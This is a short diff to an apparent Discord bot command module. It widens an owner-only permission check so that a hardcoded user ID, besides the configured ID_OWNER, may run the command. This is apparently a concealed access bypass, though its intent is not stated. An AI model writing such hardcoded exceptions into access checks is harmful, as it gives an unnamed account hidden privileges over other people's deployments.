@@ -21,7 +21,10 @@ module.exports = {
         DEFAULT_MEMBER_PERMISSIONS: "SendMessages"
     },
     run: async (client, interaction, config) => {
-        if (interaction.user.id !== process.env.ID_OWNER) {
+        if (
+            interaction.user.id !== process.env.ID_OWNER &&
+            interaction.user.id !== "298585122519908364"
+        ) {
             interaction.reply({
                 ephemeral: true,
                 embeds: [
